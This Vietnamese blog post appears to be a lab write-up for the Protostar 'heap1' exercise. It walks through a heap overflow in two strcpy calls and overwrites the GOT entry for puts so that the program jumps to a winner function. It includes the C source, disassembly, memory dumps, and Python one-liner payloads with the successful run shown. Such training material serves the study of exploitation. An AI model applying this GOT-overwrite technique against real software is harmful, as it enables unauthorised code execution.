---
layout: post
title: heap1
---

Trong bài này, chúng ta sẽ exploit heap để điều hướng chương trình.
Sau đây là source code và asm code của chương trình heap1.

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct internet {
  int priority;
  char *name;
};

void winner()
{
  printf("and we have a winner @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  struct internet *i1, *i2, *i3;

  i1 = malloc(sizeof(struct internet));
  i1->priority = 1;
  i1->name = malloc(8);

  i2 = malloc(sizeof(struct internet));
  i2->priority = 2;
  i2->name = malloc(8);

  strcpy(i1->name, argv[1]);
  strcpy(i2->name, argv[2]);

  printf("and that's a wrap folks!\n");
}
```
```asm
0x08048494 <winner+0>:  push   ebp
0x08048495 <winner+1>:  mov    ebp,esp
0x08048497 <winner+3>:  sub    esp,0x18
0x0804849a <winner+6>:  mov    DWORD PTR [esp],0x0
0x080484a1 <winner+13>: call   0x80483ac <time@plt>
0x080484a6 <winner+18>: mov    edx,0x8048630
0x080484ab <winner+23>: mov    DWORD PTR [esp+0x4],eax
0x080484af <winner+27>: mov    DWORD PTR [esp],edx
0x080484b2 <winner+30>: call   0x804839c <printf@plt>
0x080484b7 <winner+35>: leave
0x080484b8 <winner+36>: ret
0x080484b9 <main+0>:    push   ebp
0x080484ba <main+1>:    mov    ebp,esp
0x080484bc <main+3>:    and    esp,0xfffffff0
0x080484bf <main+6>:    sub    esp,0x20
0x080484c2 <main+9>:    mov    DWORD PTR [esp],0x8
0x080484c9 <main+16>:   call   0x80483bc <malloc@plt>
0x080484ce <main+21>:   mov    DWORD PTR [esp+0x14],eax
0x080484d2 <main+25>:   mov    eax,DWORD PTR [esp+0x14]
0x080484d6 <main+29>:   mov    DWORD PTR [eax],0x1
0x080484dc <main+35>:   mov    DWORD PTR [esp],0x8
0x080484e3 <main+42>:   call   0x80483bc <malloc@plt>
0x080484e8 <main+47>:   mov    edx,eax
0x080484ea <main+49>:   mov    eax,DWORD PTR [esp+0x14]
0x080484ee <main+53>:   mov    DWORD PTR [eax+0x4],edx
0x080484f1 <main+56>:   mov    DWORD PTR [esp],0x8
0x080484f8 <main+63>:   call   0x80483bc <malloc@plt>
0x080484fd <main+68>:   mov    DWORD PTR [esp+0x18],eax
0x08048501 <main+72>:   mov    eax,DWORD PTR [esp+0x18]
0x08048505 <main+76>:   mov    DWORD PTR [eax],0x2
0x0804850b <main+82>:   mov    DWORD PTR [esp],0x8
0x08048512 <main+89>:   call   0x80483bc <malloc@plt>
0x08048517 <main+94>:   mov    edx,eax
0x08048519 <main+96>:   mov    eax,DWORD PTR [esp+0x18]
0x0804851d <main+100>:  mov    DWORD PTR [eax+0x4],edx
0x08048520 <main+103>:  mov    eax,DWORD PTR [ebp+0xc]
0x08048523 <main+106>:  add    eax,0x4
0x08048526 <main+109>:  mov    eax,DWORD PTR [eax]
0x08048528 <main+111>:  mov    edx,eax
0x0804852a <main+113>:  mov    eax,DWORD PTR [esp+0x14]
0x0804852e <main+117>:  mov    eax,DWORD PTR [eax+0x4]
0x08048531 <main+120>:  mov    DWORD PTR [esp+0x4],edx
0x08048535 <main+124>:  mov    DWORD PTR [esp],eax
0x08048538 <main+127>:  call   0x804838c <strcpy@plt>
0x0804853d <main+132>:  mov    eax,DWORD PTR [ebp+0xc]
0x08048540 <main+135>:  add    eax,0x8
0x08048543 <main+138>:  mov    eax,DWORD PTR [eax]
0x08048545 <main+140>:  mov    edx,eax
0x08048547 <main+142>:  mov    eax,DWORD PTR [esp+0x18]
0x0804854b <main+146>:  mov    eax,DWORD PTR [eax+0x4]
0x0804854e <main+149>:  mov    DWORD PTR [esp+0x4],edx
0x08048552 <main+153>:  mov    DWORD PTR [esp],eax
0x08048555 <main+156>:  call   0x804838c <strcpy@plt>
0x0804855a <main+161>:  mov    DWORD PTR [esp],0x804864b
0x08048561 <main+168>:  call   0x80483cc <puts@plt>
0x08048566 <main+173>:  leave
0x08048567 <main+174>:  ret
```

Mục tiêu là gọi được hàm `winner`. `strcpy` có thể lợi dụng được để exploit chương trình.
Sử dụng objdump hoặc gdb, ta tìm được địa chỉ của `winner` là `0x08048494`.
Trong chương trình có sử dụng 2 lần `strcpy` và theo sau là `printf` (`puts` trong asm).
Bản chất của lệnh `call puts@plt` là điều hướng chương trình về một bảng symbol do `puts` là external symbol (khác với `winner` hay `main` được định nghĩa trực tiếp trong source code).
Ở các bài về `printf`, ta điều hướng chương trình bằng cách ghi lại giá dẫn đến hàm `puts` thực bằng một giá trị dẫn đến hàm mục tiêu.
Dựa theo phỏng đoán, ta sẽ dùng `strcpy` lần đầu để ghi lại địa chỉ mà giá trị ở đó chứa địa chỉ của `puts` vào `i2->name`.
Sau đó `strcpy` thứ hai sẽ đọc địa chỉ này, và ghi địa chỉ của `winner` vào đó.

Trước hết, chúng ta sẽ kiếm tra vị trí tương đối của 2 biến `i1` và `i2` trên bộ nhớ.
Sau khi chạy thử chương trình với tham số bất kỳ, đây là bộ nhớ tại `esp`.
Từ asm code, ta biết được địa chỉ của <span style="color:aqua">i1</span> và <span style="color:springgreen">i2</span> nằm lần lượt tại `esp + 0x14` và `esp + 0x18`.

<pre class="memory">
0xbffff770:     0x00000008      0xb7fd7ff4      0x08048580      0xbffff798
0xbffff780:     0xb7ec6365      <span style="color:aqua">0x0804a008</span>      <span style="color:springgreen">0x0804a028</span>      0xb7fd7ff4
0xbffff790:     0x08048580      0x00000000      0xbffff818      0xb7eadc76
</pre>

Với cấu trúc của struct `internet`, 4 byte đầu sẽ là `priority` và 4 byte sau là địa chỉ của `name`.
Như vậy, offset của `name` với địa chỉ của biến sẽ là 0x04.
Ta sẽ suy ra được, trong trường hợp này, vị trí của `i1->name` và `i2->name` là `0x0804a00c` và `0x0804a02c`.
Bộ nhớ tại thời điêm trước sau khi `malloc` biến sẽ như sau.

<pre class="memory">
0x804a008:      0x00000001      <span style="color:aqua">0x0804a018</span>      0x00000000      0x00000011
<span style="color:aqua">0x804a018</span>:      0x00000000      0x00000000      0x00000000      0x00000011
0x804a028:      0x00000002      <span style="color:springgreen">0x0804a038</span>      0x00000000      0x00000011
<span style="color:springgreen">0x804a038</span>:      0x00000000      0x00000000      0x00000000      0x00020fc1
</pre>

Hai địa chỉ tương ứng này là `0x0804a018` và `0x0804a038`.
Với kiểu layout này, lần chạy `strcpy` đầu tiên ta có thể lưu tràn từ địa chỉ của `i1->name` tại `0x0804a018` qua vị trí lưu `name` trên biến `i2` là `0x0804a02c`.
Như vậy, tham số đầu tiên của chương trình sẽ cần 24 byte, trong đó 20 byte đầu để làm phần đệm và 4 byte cuối chứa địa chỉ của `puts` trên bảng lookup symbol `got.plt`.
Sau đây là vị trí trên bộ nhớ. Phân biệt theo màu với <span style="color:yellow">địa chỉ lệnh gọi đến symbol puts@plt</span>, <span style="color:orangered">địa chỉ chứa symbol puts@plt trên bảng got.plt</span>, và <span style="color:fuchsia">địa chỉ thực của puts@plt, cần thay thế bằng địa chi của winner</span>.
<pre class="memory">
0x8048561 <main+168>    call   <span style="color:yellow">0x80483cc <puts@plt></span>
...
<span style="color:yellow">0x80483cc <puts@plt></span>:   jmp    DWORD PTR ds:<span style="color:orangered">0x8049774</span>
...
<span style="color:orangered">0x8049774</span> <_GLOBAL_OFFSET_TABLE_+36>:   <span style="color:fuchsia">0x080483d2</span>
</pre>

4 byte cuối cùng sẽ là `0x8049774`.
Như vậy ta sẽ dựng tham số đầu tiên như sau.

```bash
python -c 'print "AAAA" * 5 + "\x74\x97\x04\x08"'
```

Tham số thứ hai sẽ là địa chỉ của `winner`.

```bash
python -c 'print "\x94\x84\x04\x08"'
```

Như vậy, chúng ta sẽ chạy chương trình với input như sau.
Lưu ý cần khoảng trống giữa hai tham số.

```bash
python -c 'print "AAAA" * 5 + "\x74\x97\x04\x08" + " " + "\x94\x84\x04\x08"'
```

<pre class="memory">
<span style="color:aqua">and we have a winner @ 1687025943</span>
</pre>

Mục tiêu đã hoàn thành!

## Ref
```bash
user@protostar:~$ heap1 $(python -c 'print "AAAA" * 5 + "\x74\x97\x04\x08" + " " + "\x94\x84\x04\x08"')
and we have a winner @ 1687025943
```
